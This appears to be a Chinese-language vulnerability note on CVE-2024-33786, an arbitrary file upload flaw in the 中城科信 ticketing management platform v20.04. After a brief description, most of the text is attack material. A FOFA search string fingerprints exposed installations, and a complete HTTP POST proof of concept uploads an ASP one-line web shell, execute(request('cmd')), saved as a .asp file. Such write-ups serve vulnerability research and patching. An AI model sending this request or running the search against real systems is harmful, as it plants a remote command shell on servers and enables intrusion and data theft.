### 1.漏洞描述
基础六管控多协同，智慧票务系统以私有/公有云为基础部署，提供票类策略管控、售票流程管控、门票核验管控、营销渠道管控、数据分析管控、财务核销管控功能，与其它业务系统数据共享，协同作业。中城科信票务管理平台20.04中存在任意文件上传漏洞，攻击者可以通过上传精心设计的文件来执行任意代码。

CVE编号：

CVE-2024-33786

### 2.影响版本
v20.04  

# fofa
```plain
body="SystemManager/SoftwareLicense.htm"
```

# POC
```plain
POST /SystemManager/Introduction.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 507
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Accept-Encoding: gzip

----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="5.txt"
Content-Type: image/jpeg

<%execute(request("cmd"))%>

----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

test_20240504.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UpdateUploadLinkPic
----------------------------354575237365372692397370
```

![](https://cdn.nlark.com/yuque/0/2024/png/43104311/1727183496935-001f5bdd-a424-4e4a-8b50-0354cca5f2f2.png)

